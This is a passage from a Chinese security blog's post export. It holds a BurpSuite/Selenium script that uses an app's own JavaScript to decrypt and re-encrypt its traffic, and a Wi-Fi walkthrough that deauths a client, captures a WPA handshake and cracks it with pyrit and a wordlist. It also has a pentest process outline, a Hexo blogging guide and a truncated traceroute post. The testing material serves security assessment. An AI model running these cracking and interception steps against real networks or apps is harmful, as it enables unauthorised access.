<p>这里就用到了<code>webdriver</code>，我们可以使用python启动一个浏览器，让浏览器去访问APP中浏览的页面！<br>而且，我们还能通过python脚本把我们的JS代码加载到这个浏览器当中！<br>而且，我们还能通过python脚本在这个浏览器中执行js代码！<br>而且，我们还有<code>Burpy</code>！</p>
<p>来看一下怎么搞！</p>
<p>先来看下代码（已脱敏）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment"># 别忘了安装依赖</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">chromeExec = <span class="string">&quot;/usr/bin/chromedriver&quot;</span> <span class="comment"># 需要自己下载chromedriver</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://xxxx.com:58100/xxxx/xxxx&quot;</span> <span class="comment"># 这里就是APP中的Webview当中加载的页面，不过对于一些公司来说，他们通常用一套东西，自己体会</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        this is called from the start of PyRo4 service, so init webdriver here</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        option = webdriver.ChromeOptions()</span><br><span class="line">        option.add_argument(<span class="string">&#x27;headless&#x27;</span>)</span><br><span class="line">        self.driver = webdriver.Chrome(executable_path=chromeExec, chrome_options=option)</span><br><span class="line">        self.driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">        self.driver.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            js = self.load_js()</span><br><span class="line">            self.driver.execute_script(js)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed to load MouldueRaid JS&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver.quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_js</span>(<span class="params">self</span>):</span><br><span class="line">        jsFilePath = <span class="string">r&quot;/home/m0nst3r/tools/moduleraid.js&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(jsFilePath) <span class="keyword">as</span> f:</span><br><span class="line">            jsContent = f.read()</span><br><span class="line">        <span class="keyword">return</span> jsContent</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">if</span> body.startswith(<span class="string">&quot;msg=&quot;</span>):</span><br><span class="line">            data = urllib.unquote(body[<span class="built_in">len</span>(<span class="string">&#x27;msg=&#x27;</span>):])</span><br><span class="line">            DecRes = <span class="string">&quot;&quot;&quot;return window.mR.modules.xxxx.xxxx.decryptData(&#x27;%s&#x27;)&quot;&quot;&quot;</span> % (data)</span><br><span class="line"></span><br><span class="line">            result = self.driver.execute_script(DecRes)</span><br><span class="line">            result = json.dumps(result)</span><br><span class="line">            nbody = <span class="string">&quot;msg=&quot;</span>+result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># the body is the json string</span></span><br><span class="line">            data_json = urllib.unquote(body)</span><br><span class="line">            DecRes = <span class="string">&quot;&quot;&quot;return JSON.stringify(window.mR.modules.xxxx.xxxx.decryptData(&#x27;%s&#x27;))&quot;&quot;&quot;</span> % (data_json)</span><br><span class="line">            result = self.driver.execute_script(DecRes)</span><br><span class="line">            nbody = <span class="string">&quot;msg=&quot;</span>+result</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> header, nbody</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        data = body[<span class="built_in">len</span>(<span class="string">&#x27;msg=&#x27;</span>):]</span><br><span class="line">        data_b64 = b64encode(data)</span><br><span class="line"></span><br><span class="line">        EncRes = <span class="string">&quot;&quot;&quot;return window.mR.modules.xxxx.xxx.encryptData(JSON.parse(atob(&quot;%s&quot;)));&quot;&quot;&quot;</span> % (data_b64)</span><br><span class="line"></span><br><span class="line">        result = self.driver.execute_script(EncRes)</span><br><span class="line">        result_json = json.loads(result)</span><br><span class="line">        result_json[<span class="string">&quot;K3&quot;</span>] = <span class="string">&quot;h5&quot;</span></span><br><span class="line">        result = json.dumps(result_json)</span><br><span class="line">        </span><br><span class="line">        nbody = <span class="string">&#x27;msg=&#x27;</span>+urllib.quote(result)</span><br><span class="line">        <span class="keyword">return</span> header, nbody</span><br></pre></td></tr></table></figure>
<p>由于考虑这个<code>webdriver</code>的问题，我才把<code>Burpy</code>脚本改成了类的形式。因为webdriver每次启动的时候比较费时，而通过类中的<code>__init__</code>方法，我们可以把这个保持这个类的实例，所以再次调用的时候就不用初始化了。不过，我们点击<code>start server</code>的时候会感觉到一些延迟。</p>
<p>脱敏之后的这个脚本肯定是运行不了的，但为了演示效果，我原来的文件不能乱改，所以，直接给大家看一下效果就好了：</p>
<p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/webdriver_test.gif"></p>
<h4 id="Auto-Enc-x2F-Dec"><a href="#Auto-Enc-x2F-Dec" class="headerlink" title="Auto Enc&#x2F;Dec"></a>Auto Enc&#x2F;Dec</h4><p>这个功能是同事提出的意见，花了半天的时间实现了，由此可见我的Java编程功底真的是很浅。。。。</p>
<p>这个功能可以说是灵魂技能！就好比，，，没想出来，总之很牛逼。</p>
<p>为啥这么说呢？</p>
<p>大家发现没有，上面的操作中我每次还需要右键一下，滑动鼠标，瞄准一个菜单，再点击。<br>做为一个懒到极致的人，这些操作都觉得麻烦！于是<code>Auto Enc/Dec</code>来了，只要你写好加密、解密功能，点开这个开关，你直接写明文！<br>对，明文就行了，你点<code>Go</code>的时候，自动调用脚本中的<code>encrypt</code>函数进行加密，拿到服务器返回数据之后，自动调用脚本中的<code>decrypt</code>函数解密！</p>
<p>同学，还有比这更美的吗？</p>
<p>来体验加证明一下，为了简单，我就用Base64测试的那个脚本吧。</p>
<p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/auto.gif"></p>
<p>大家可以通过wireshark看到，其实这块的实现还有bug。<br>不过，我应该会很快补上的，恩，不会很久的。</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>如果这个长文你都看完了，欢迎到Github上赏Star，欢迎提出改进建议，更欢迎contribution。</p>
<p>么么哒！</p>
<p><a href="https://github.com/mr-m0nst3r/Burpy">https://github.com/mr-m0nst3r/Burpy</a></p>
]]></content>
      <categories>
        <category>burpsuite</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>burpy</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>无线安全检查记录</title>
    <url>/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95.html</url>
    <content><![CDATA[<h1 id="无线安全检查"><a href="#无线安全检查" class="headerlink" title="无线安全检查"></a>无线安全检查</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li><p>工具： 一块8187无线网卡<br><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-15-49.png"></p>
</li>
<li><p>安装aircrack-ng： <code>sudo pacman -S aircrack-ng</code></p>
</li>
<li><p>安装pyrit: <code>sudo pacman -S pyrit</code></p>
</li>
</ol>
<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><ol>
<li>开启网上监听模式：<br><code>sudo airmon-ng start &lt;interface&gt;</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-19-24.png"></p>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-22-16.png"></p>
<ol start="2">
<li>确定目标：<br><code>sudo airodump-ng &lt;mon-interface&gt;</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-25-09.png"></p>
<p>就来测试一下<code>ES-120727</code>这个无线的安全。</p>
<ul>
<li>BSSID: 40:xx:xx:xx:xx:41</li>
<li>ESSID: ES-120727</li>
<li>Channel: 11</li>
</ul>
<ol start="3">
<li>针对性抓包：<br><code>sudo airodump-ng --bssid 40:xx:xx:xx:xx:41 --channel 11 --essid ES-120727 -w es120727-test  wlp0s20f0u1mon</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-33-12.png"></p>
<p>发现一个用户连接着，要抓握手包，得让他们重新连接，否则只能等。</p>
<ol start="4">
<li>Deauth:</li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-10-47-22.png"></p>
<p>成功抓到握手包。</p>
<ol start="5">
<li><p>分析握手包是否完整：<br><code>pyrit -r es120727-test-01.cap analyze</code><br><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-02-22.png"></p>
</li>
<li><p>重新抓包直到抓到完整的握手包：</p>
</li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-18-59.png"></p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><ol>
<li>导入密码字典<br><code>pyrit -i ~/tools/pentest/dicts/rockyou.txt.gz import_passwords</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-36-27.png"></p>
<ol start="2">
<li>创建AP<br><code>pyrit -e ES-120727 create_essid</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-38-15.png"></p>
<ol start="3">
<li>计算PMK<br><code>pyrit batch</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-11-40-51.png"></p>
<p>这个过程比较慢。</p>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-12-37-23.png"></p>
<ol start="4">
<li>暴破<br><code>pyrit -r es120727-test3-01.cap.gz attack_db</code></li>
</ol>
<p><img src="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95/2020-11-11-12-42-47.png"></p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>wifi</tag>
        <tag>aircrack</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试流程规范</title>
    <url>/pentest/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E8%A7%84%E8%8C%83.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="渗透测试流程规范"><a href="#渗透测试流程规范" class="headerlink" title="渗透测试流程规范"></a>渗透测试流程规范</h1><p>为规范渗透测试当中的工作流程，方便团队协作与管理，特制定本规范。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集的目的是为了全面的了解目标网站&#x2F;系统，从而可以确定潜在攻击面以及攻击方法。</p>
<p>信息收集工作内容包括但不限于：</p>
<ol>
<li>whois信息</li>
<li>域名&#x2F;IP地址</li>
<li>目标域名&#x2F;IP开放端口</li>
<li>（若在测试范围）子域名&#x2F;IP信息</li>
<li>目标网站信息，如服务器操作系统，使用的变成语言，使用的Web服务器及版本，后端可能的数据库服务器</li>
<li>目标网站&#x2F;系统敏感目录文件</li>
<li>目标网站&#x2F;系统登录后台</li>
</ol>
<h2 id="前渗透"><a href="#前渗透" class="headerlink" title="前渗透"></a>前渗透</h2><p>前渗透主要工作是拿到目标网站&#x2F;系统的数据或权限，并以此为突破口进行后续流程。</p>
<p>前渗透的工作内容包括但不限于：</p>
<ol>
<li>敏感信息泄漏检测</li>
<li>权限验证检测</li>
<li>不安全的验证机制检测</li>
<li>暴力破解检测</li>
<li>SQL注入漏洞检测</li>
<li>XSS漏洞检测</li>
<li>命令注入检测</li>
<li>文件上传漏洞检测</li>
<li>文件包含漏洞检测</li>
<li>服务器漏洞检测</li>
<li>Web服务器及中间件漏洞检测</li>
</ol>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透主要工作是对前渗透阶段拿到的网站&#x2F;系统的数据或权限，对目标网站&#x2F;系统所在的网络进行进一步渗透测试以及持久化。</p>
<p>后渗透的工作内容包括但不限于：</p>
<ol>
<li>收集目标主机信息，包括：</li>
<li>当前系统用户及权限</li>
<li>当前网络状态</li>
<li>当前系统版本及补丁状态</li>
<li>反病毒&#x2F;防火墙信息</li>
<li>收集敏感文件信息</li>
<li>收集目标主机所在内网信息，包括：</li>
<li>内网存活主机扫描</li>
<li>内网端口扫描</li>
<li>域环境信息</li>
<li>权限提升</li>
<li>横向移动</li>
<li>持久化</li>
<li>内网系统漏洞检测及利用</li>
</ol>
<h2 id="测试报告"><a href="#测试报告" class="headerlink" title="测试报告"></a>测试报告</h2><p>测试报告是对一次渗透测试结果的分析及总结，其内容应包括但不限于：</p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ol>
<li>测试目的</li>
<li>测试范围</li>
<li>测试团队详细信息</li>
<li>测试结果综述</li>
</ol>
<h3 id="详细测试流程"><a href="#详细测试流程" class="headerlink" title="详细测试流程"></a>详细测试流程</h3><ol>
<li>测试工具列表</li>
<li>测试步骤</li>
</ol>
<ul>
<li>每个漏洞一个标题&#x2F;标号</li>
<li>测试步骤应将所有发现的漏洞&#x2F;风险体现，使得技术人员通过渗透测试报告进行漏洞复现。</li>
</ul>
<h3 id="风险评级"><a href="#风险评级" class="headerlink" title="风险评级"></a>风险评级</h3><p>对目标网站&#x2F;系统进行综合评价。</p>
<h3 id="漏洞详情及修复建议"><a href="#漏洞详情及修复建议" class="headerlink" title="漏洞详情及修复建议"></a>漏洞详情及修复建议</h3><p>针对每个漏洞进行分析，包括：</p>
<ol>
<li>风险评级</li>
<li>漏洞描述</li>
<li>漏洞影响</li>
<li>修复建议</li>
</ol>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>用hexo在github/gitee上建博客</title>
    <url>/blaa/%E7%94%A8hexo%E5%9C%A8github-gitee%E4%B8%8A%E5%BB%BA%E5%8D%9A%E5%AE%A2.html</url>
    <content><![CDATA[<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>自己在VPS上也可以弄，这个博客上有设置方法，还能够自动更新HTTPS证书。可自行查找。</p>
<p>但作为一个记录、分享型的博客，没必要用后端数据库，直接静态页面就行。</p>
<p>而静态页面最好就是用Markdown写作了。</p>
<p>那自然想到Hexo，但Hexo如果放在VPS上，还需要配置nginx或者hexo-admin插件，才能像常规CMS一样更新内容。总感觉有些不方便。</p>
<p>于是就有了这次的折腾。</p>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>折腾完之后，工作流是这样的：</p>
<ol>
<li>本地<code>hex new \[文章名字\]</code></li>
<li>本地 <code>vscode</code>，编写markdown</li>
<li>写完之后，<code>hexo g &amp;&amp; hexo d</code> 自动上传到gitee和github。是的，两个同时传。</li>
<li>gitee无法绑定个人域名，github可以。所以两个都传。都免费的，不用白不用，万一其中一个不能用了，另一个顶上。</li>
</ol>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>wsl2 ubuntu</p>
<h2 id="vs-code"><a href="#vs-code" class="headerlink" title="vs code"></a>vs code</h2><p>插件如下：</p>
<ul>
<li>Markdown Preview Enhanced</li>
<li>Paste Image</li>
</ul>
<p>其中<code>Paste Image</code>配置好下：<br><img src="/blaa/%E7%94%A8hexo%E5%9C%A8github-gitee%E4%B8%8A%E5%BB%BA%E5%8D%9A%E5%AE%A2/2020-04-07-23-35-57.png"></p>
<h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>需要安装的插件</p>
<ul>
<li>hexo-generate-searchdb</li>
<li>hexo-deployer-git</li>
<li>hexo-excerpt</li>
<li>next 主题</li>
</ul>
<h2 id="github-与-gitee"><a href="#github-与-gitee" class="headerlink" title="github 与 gitee"></a>github 与 gitee</h2><ol>
<li><p>申请账号</p>
</li>
<li><p>新建repo</p>
<ul>
<li>github上用<code>username.github.io</code></li>
<li>gitee上用<code>username</code></li>
</ul>
</li>
<li><p>生成密钥，并把同一个公钥都添加到github和gitee</p>
</li>
<li><p>github上设置github page, 绑定个人域名，在<code>theme/next/source</code>下，新建<code>CNAME</code>文件，内容为你的域名</p>
</li>
<li><p>在域名服务商那里设置dns解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">record  host    target</span><br><span class="line"></span><br><span class="line">A   @   185.199.108.153</span><br><span class="line">A   @   185.199.109.153</span><br><span class="line">A   @   185.199.110.153</span><br><span class="line">A   @   185.199.111.153</span><br><span class="line">CNAME   www     [your-username].github.io</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>设置<code>hexo</code>的<code>_config.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&#x27;git@gitee.com:m0nst3r/m0nst3r.git&#x27;</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">&#x27;master&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">&#x27;git@github.com:mr-m0nst3r/mr-m0nst3r.github.io.git&#x27;</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">&#x27;master&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>先安装依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m pip install pyvirtualdisplay</span><br><span class="line">python3 -m pip install selenium</span><br><span class="line">sudo apt-get install xvfb</span><br><span class="line">wget https://chromedriver.storage.googleapis.com/80.0.3987.106/chromedriver_linux64.zip</span><br><span class="line">unzip chromedriver_linux64.zip</span><br><span class="line">sudo mv chromedriver /usr/bin/</span><br><span class="line">sudo apt install libnss3 libnss3-dev libnss3-tools chromium-browser</span><br></pre></td></tr></table></figure>
</li>
<li><p>gitee上的页面不是push上去就会更新，需要登陆点一下，于是借用了这个脚本.</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.alert <span class="keyword">import</span> Alert</span><br><span class="line"></span><br><span class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>, <span class="number">600</span>))</span><br><span class="line">display.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟浏览器打开到gitee登录界面</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&#x27;https://gitee.com/login&#x27;</span>)</span><br><span class="line"><span class="comment"># 将窗口最大化</span></span><br><span class="line">driver.maximize_window()</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入账号--通过html的id属性定位输入位置--改为你的账号</span></span><br><span class="line">user_login = driver.find_element_by_id(<span class="string">&#x27;user_login&#x27;</span>)</span><br><span class="line">user_login.send_keys(<span class="string">&quot;改为你的账号&quot;</span>)</span><br><span class="line"><span class="comment"># 输入密码--通过html的id属性定位输入位置--改为你的密码</span></span><br><span class="line">driver.find_element_by_id(<span class="string">&#x27;user_password&#x27;</span>).send_keys(<span class="string">&quot;改为你的密码&quot;</span>)</span><br><span class="line"><span class="comment"># 点击登录按钮--通过xpath确定点击位置</span></span><br><span class="line">driver.find_element_by_xpath(</span><br><span class="line">    <span class="string">&#x27;/html/body/div[2]/div[2]/div/div[1]/div[2]/div/form[1]/div[2]/div/div/div[4]/input&#x27;</span>).click()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到gitee pages界面--改为you_gitee_id</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://gitee.com/改为you_gitee_id/改为you_gitee_id/pages&#x27;</span>)</span><br><span class="line"><span class="comment"># 点击更新按钮--通过xpath确定点击位置</span></span><br><span class="line"><span class="comment"># /html/body/div[3]/div[2]/div/div[2]/div[1]/form/div[7]</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">&#x27;/html/body/div[3]/div[2]/div/div[2]/div[1]/form/div[7]&#x27;</span>).click()</span><br><span class="line"><span class="comment"># 确认更新提示框--这个函数的作用是确认提示框</span></span><br><span class="line">Alert(driver).accept()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待5秒更新</span></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个print其实没事什么用,如果真的要测试脚本是否运行成功，可以用try来抛出异常</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;成功&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 脚本运行成功,退出浏览器</span></span><br><span class="line">driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写上更新日志</span></span><br><span class="line"><span class="comment"># 我这里是写在D盘，可以改为自己喜欢的目录</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;D:\sites\log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line">now_time = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">fp.write(<span class="string">&quot;auto update time:&#123;0&#125;\n&quot;</span>.<span class="built_in">format</span>(now_time))</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>

<p>最后优化一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x gitee-update.py</span><br><span class="line">sudo ln -s /mnt/d/sites/gitee-update.py /usr/bin/update-gitee</span><br></pre></td></tr></table></figure>
<p>以后更新完之后，执行<code>update-gitee</code>就ok了！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">michael@DESKTOP-HE0BL7H:/mnt/d/sites/m0nst3r.me$ hexo g &amp;&amp; hexo d</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Files loaded in 995 ms</span><br><span class="line">INFO  Generated: blaa/用hexo在github-gitee上建博客.html</span><br><span class="line">INFO  Generated: index.html</span><br><span class="line">INFO  Generated: search.xml</span><br><span class="line">INFO  3 files generated in 1.18 s</span><br><span class="line">INFO  Deploying: git</span><br><span class="line">INFO  Clearing .deploy_git folder...</span><br><span class="line">INFO  Copying files from public folder...</span><br><span class="line">INFO  Copying files from extend dirs...</span><br><span class="line">[master b0ccc14] Site updated: 2020-04-07 23:50:20</span><br><span class="line"> 3 files changed, 17 insertions(+), 7 deletions(-)</span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 12 threads.</span><br><span class="line">Compressing objects: 100% (6/6), done.</span><br><span class="line">Writing objects: 100% (6/6), 2.73 KiB | 62.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 5), reused 0 (delta 0)</span><br><span class="line">remote: Powered by GITEE.COM [GNK-3.8]</span><br><span class="line">To gitee.com:m0nst3r/m0nst3r.git</span><br><span class="line">   030129a..b0ccc14  HEAD -&gt; master</span><br><span class="line">Branch &#x27;master&#x27; set up to track remote branch &#x27;master&#x27; from &#x27;git@gitee.com:m0nst3r/m0nst3r.git&#x27;.</span><br><span class="line">INFO  Deploy done: git</span><br><span class="line">INFO  Deploying: git</span><br><span class="line">INFO  Clearing .deploy_git folder...</span><br><span class="line">INFO  Copying files from public folder...</span><br><span class="line">INFO  Copying files from extend dirs...</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 12 threads.</span><br><span class="line">Compressing objects: 100% (6/6), done.</span><br><span class="line">Writing objects: 100% (6/6), 2.73 KiB | 60.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 5), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (5/5), completed with 5 local objects.</span><br><span class="line">To github.com:mr-m0nst3r/mr-m0nst3r.github.io.git</span><br><span class="line">   030129a..b0ccc14  HEAD -&gt; master</span><br><span class="line">Branch &#x27;master&#x27; set up to track remote branch &#x27;master&#x27; from &#x27;git@github.com:mr-m0nst3r/mr-m0nst3r.github.io.git&#x27;.</span><br><span class="line">INFO  Deploy done: git</span><br><span class="line">michael@DESKTOP-HE0BL7H:/mnt/d/sites$ update-gitee</span><br><span class="line">成功</span><br><span class="line">michael@DESKTOP-HE0BL7H:/mnt/d/sites$ </span><br></pre></td></tr></table></figure>

<h1 id="流程完美！打完收工"><a href="#流程完美！打完收工" class="headerlink" title="流程完美！打完收工"></a>流程完美！打完收工</h1>]]></content>
      <categories>
        <category>blaa</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>github pages</tag>
        <tag>gitee page</tag>
      </tags>
  </entry>
  <entry>
    <title>细思极恐</title>
    <url>/blaa/%E7%BB%86%E6%80%9D%E6%9E%81%E6%81%90.html</url>
    <content><![CDATA[<p>访问我的服务器，配置好HTTPS，却怎么也访问不了。<br>让朋友测试，那边网络没问题，于是我挂上SS的VPN，结果还是不能访问。<br>挂上ExpressVPN，访问成功。</p>
<p>断开VPN，测试网络，却发现了一件细思极恐的事情：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo traceroute www.baidu.com</span></span><br><span class="line">Password:</span><br><span class="line">traceroute to www.a.shifen.com (119.75.217.109), 64 hops max</span><br><span class="line">  1   192.168.1.1  0.891ms  0.748ms  0.711ms </span><br><span class="line">  2   117.100.128.1  2.796ms  4.092ms  2.412ms </span><br><span class="line">  3   124.205.97.48  4.353ms  4.192ms  3.938ms </span><br><span class="line">  4   124.205.98.185  4.487ms  4.192ms  4.391ms </span><br><span class="line">  5   14.197.243.61  3.509ms  4.679ms  4.105ms </span><br><span class="line">  6   14.197.149.178  4.838ms  4.168ms  3.958ms </span><br><span class="line">  7   182.61.253.119  5.056ms  5.903ms  3.998ms </span><br><span class="line">  8   182.61.253.126  4.463ms  4.007ms  4.264ms </span><br><span class="line">  9   *  *  * </span><br><span class="line"> 10   *  *  * </span><br><span class="line"> 11   *  *  * </span><br><span class="line"> 12   *  *  * </span><br><span class="line"> 13   *  *  * </span><br><span class="line"> 14   *  *  * </span><br><span class="line"> 15   *  *  * </span><br><span class="line"> 16   *  *  * </span><br><span class="line"> 17   *  *  * </span><br><span class="line"> 18   *  *  * </span><br><span class="line"> 19   *  *  * </span><br><span class="line"> 20   *  *  * </span><br><span class="line"> 21   *  *  * </span><br><span class="line"> 22   *  *  * </span><br><span class="line"> 23   *  *  * </span><br><span class="line"> 24   *  *  * </span><br><span class="line"> 25   *  *  * </span><br><span class="line"> 26   *  *  * </span><br><span class="line"> 27   *  *  * </span><br><span class="line"> 28   *  *  * </span><br><span 